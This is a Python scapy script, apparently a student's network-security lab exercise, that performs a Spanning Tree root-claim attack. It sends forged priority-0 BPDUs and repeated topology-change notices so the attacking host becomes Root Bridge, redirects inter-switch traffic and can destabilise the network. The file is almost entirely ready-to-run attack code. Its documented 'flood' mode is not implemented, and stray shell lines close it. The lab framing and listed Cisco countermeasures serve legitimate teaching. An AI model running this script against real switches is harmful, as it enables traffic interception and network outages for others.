#!/usr/bin/env python3
"""
=============================================================
  ATAQUE 06 — STP Root Claim Attack
=============================================================
  Autor      : Estudiante 20211150
  Red de lab : 192.168.150.0/24
  Atacante   : 192.168.150.254 (Kali Linux - eth0)
  Target     : SW1-20211150 y SW2-20211150
  Interfaz   : eth0

  DESCRIPCIÓN:
    STP (Spanning Tree Protocol, IEEE 802.1D) previene bucles
    eligiendo un Root Bridge basándose en:
      1. Bridge Priority más bajo (rango: 0-61440, default: 32768)
      2. MAC más baja en caso de empate

    Este script envía BPDUs (Bridge Protocol Data Units) con:
      • Priority = 0   → valor más bajo posible → siempre gana
      • MAC = 00:00:00:00:00:01 → muy baja → garantiza ser Root

    IMPACTO:
      • Kali se convierte en Root Bridge
      • El tráfico entre los switches se redirige hacia Kali
      • Puertos bloqueados pueden activarse → bucles temporales
      • La red puede quedar inestable 10-30 segundos

    VERIFICAR en el switch:
      show spanning-tree           → ver quién es el Root Bridge
      show spanning-tree detail    → ver BPDUs recibidos

  MODOS:
    claim → Root Bridge estable (envía BPDUs constantes con Priority=0)
    flood → Desestabilizar STP  (BPDUs con prioridades variables)

  USO:
    sudo python3 06_stp_root_attack.py
    sudo python3 06_stp_root_attack.py eth0 claim
    sudo python3 06_stp_root_attack.py eth0 flood

  CONTRAMEDIDA (en el switch Cisco):
    SW1(config)# spanning-tree portfast bpduguard default
    SW1(config-if)# spanning-tree guard root
    SW1(config-if)# spanning-tree bpduguard enable
=============================================================
"""

import sys, time, signal, struct, random
from scapy.all import Ether, LLC, sendp, conf, get_if_hwaddr

INTERFAZ        = "eth0"
MODO            = "claim"
BRIDGE_PRIORITY = 0
ATACANTE_MAC    = "00:00:00:00:00:01"
HELLO_INTERVAL  = 1.0
enviados        = 0
corriendo       = True

def salir(sig, frame):
    print(f"\n[!] Detenido. BPDUs enviados: {enviados}")
    print("  CONTRAMEDIDA:")
    print("  SW1(config-if)# spanning-tree bpduguard enable")
    sys.exit(0)

def mac_a_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":"))

def construir_bpdu_config(priority, bridge_mac):
    mac_bytes = mac_a_bytes(bridge_mac)
    root_id   = struct.pack("!H", priority) + mac_bytes
    bridge_id = struct.pack("!H", priority) + mac_bytes
    bpdu = (
        b'\x00\x00'         # Protocol ID
        b'\x00'             # Version
        b'\x00'             # BPDU Type: Config
        b'\x00'             # Flags
        + root_id           # Root ID (8 bytes)
        + b'\x00\x00\x00\x00'  # Root Path Cost
        + bridge_id         # Bridge ID (8 bytes)
        + b'\x80\x01'       # Port ID
        + b'\x00\x00'       # Message Age
        + b'\x14\x00'       # Max Age (20)
        + b'\x02\x00'       # Hello Time (2)
        + b'\x0f\x00'       # Forward Delay (15)
    )
    return bpdu

def construir_bpdu_tcn():
    return (
        b'\x00\x00'     # Protocol ID
        b'\x00'         # Version
        b'\x80'         # BPDU Type: TCN
    )

def enviar_bpdu(interfaz, bpdu_data, src_mac):
    pkt = (
        Ether(src=src_mac, dst="01:80:c2:00:00:00")
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
    )
    return pkt / bpdu_data

def main():
    global enviados, corriendo
    interfaz = sys.argv[1] if len(sys.argv) > 1 else INTERFAZ
    modo     = sys.argv[2] if len(sys.argv) > 2 else MODO

    signal.signal(signal.SIGINT, salir)
    conf.verb = 0

    print("=" * 50)
    print("  ATAQUE STP Root Claim - Matricula 20211150")
    print("=" * 50)
    print(f"  Interfaz  : {interfaz}")
    print(f"  Modo      : {modo}")
    print(f"  Priority  : {BRIDGE_PRIORITY}")
    print(f"  MAC       : {ATACANTE_MAC}")
    print(f"  Target    : SW1-20211150 (20.21.11.2)")
    print("=" * 50)
    print("  Ctrl+C para detener\n")

    # Enviar TCN inicial para limpiar tablas MAC
    print("  [*] Enviando TCN inicial...")
    tcn = enviar_bpdu(interfaz, construir_bpdu_tcn(), ATACANTE_MAC)
    for _ in range(5):
        sendp(tcn, iface=interfaz, verbose=False)
        time.sleep(0.1)
    print("  [+] TCN enviado. Switches limpiando tablas...\n")

    bpdu_data = construir_bpdu_config(BRIDGE_PRIORITY, ATACANTE_MAC)

    ciclo = 0
    while corriendo:
        pkt = enviar_bpdu(interfaz, bpdu_data, ATACANTE_MAC)
        sendp(pkt, iface=interfaz, verbose=False)
        enviados += 1

        if ciclo % 10 == 0:
            tcn = enviar_bpdu(interfaz, construir_bpdu_tcn(), ATACANTE_MAC)
            sendp(tcn, iface=interfaz, verbose=False)

        print(
            f"  [CLAIM] BPDUs: {enviados:>5}  "
            f"Priority: {BRIDGE_PRIORITY}  "
            f"MAC: {ATACANTE_MAC}",
            end="\r"
        )
        ciclo += 1
        time.sleep(HELLO_INTERVAL)

if __name__ == "__main__":
    main()
EOF
echo "Script creado OK"
